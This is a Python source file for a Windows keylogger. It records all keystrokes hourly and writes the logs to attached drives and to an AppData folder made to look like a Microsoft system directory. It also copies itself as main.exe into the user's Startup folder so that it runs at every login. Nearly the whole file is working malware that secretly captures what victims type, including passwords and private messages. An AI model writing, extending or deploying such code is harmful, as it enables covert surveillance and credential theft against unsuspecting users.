import keyboard
import datetime
import time
import os
import sys
import shutil
import string
from ctypes import windll
import wmi
import random

def display_and_save_recorded(recorded,current,target):
    final_recorded_text=''
    for i in recorded:
        i=str(i)
        i=i.replace('KeyboardEvent(','')
        i=i.replace('down)','')
        i=i.replace('backspace','BS')
        if 'up)' in i:
            i=''
        i=i.replace(' ','')
        if 'space' in i:
            final_recorded_text=final_recorded_text+' '
        elif 'tab' in i:
            final_recorded_text=final_recorded_text+'   '+'Tab'+'   '
        elif 'enter' in i:
            final_recorded_text=final_recorded_text+'\n'
        elif i in ('printscreen','insert','delete','shift','rightshift','pagedown','pageup','pause','esc','capslock'):
            final_recorded_text=final_recorded_text
        elif 'BS' in i :
            final_recorded_text=final_recorded_text+'<- '+i+' ->'
        elif 'ctrl' in i:
            final_recorded_text=final_recorded_text+'  '+i+' '
        else:
            final_recorded_text=final_recorded_text+i


    def get_drives():
        drives = []
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drives.append(letter)
            bitmask >>= 1
        return drives

    drives=get_drives()
    required_directory=[]
    for i in range(0,len(drives)):
        if drives[i]+':'!=cd_drive and drives[i]+':'!=boot_drive:
            required_directory.append(drives[i])
    print(required_directory)
    for i in range(0,len(required_directory)):
        with open(required_directory[i]+':/log'+current+'-'+target+'.txt','a') as f:
            try:
                f.writelines(final_recorded_text)
            except:
                print('')
    if not os.path.exists(folder_seg_1+user+'/AppData/Roaming/Microsoft/Windows/logs'):
        os.mkdir(folder_seg_1+user+'/AppData/Roaming/Microsoft/Windows/logs')

    for i in range(0,len(required_directory)):
            try:
                shutil.copy(required_directory[i]+':/log'+current+'-'+target+'.txt',folder_seg_1+user+'/AppData/Roaming/Microsoft/Windows/logs/log'+current+'-'+target+'.txt')
                os.remove(required_directory[i]+':/log'+current+'-'+target+'.txt')
            except:
                print('')

def iterate_forever():
    while True:
        t=datetime.datetime.now()
        t=t.hour
        current=t
        target=t+1
        if t>=24:
            t=0
        else:
            t=int(t)+1

        recorded=keyboard.start_recording()
        while True:
            time.sleep(1)
            x=datetime.datetime.now()
            t_hour=x.hour
            t_hour=int(t_hour)
            if t_hour==t:
                break
        recorded=keyboard.stop_recording()
        display_and_save_recorded(recorded,str(current),str(target))

def main():
    try:
        shutil.copyfile(original,final)
        iterate_forever()
    except:
        iterate_forever()


'''universal things that are needed everywhere all done outside so i can use it anywhere'''
boot_drive = (os.getenv("SystemDrive"))
user = str(os.getlogin())
user.strip()
script_path = (sys.argv[0])
folder_seg_1 = (boot_drive + '/Users/')
folder_seg_2 = ('/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
folder_startup = (folder_seg_1 + user + folder_seg_2)
original=r'main.exe'
final=folder_startup+'/main.exe'

c = wmi.WMI()
for cdrom in c.Win32_CDROMDrive():
    cd_drive=cdrom.Drive

main()
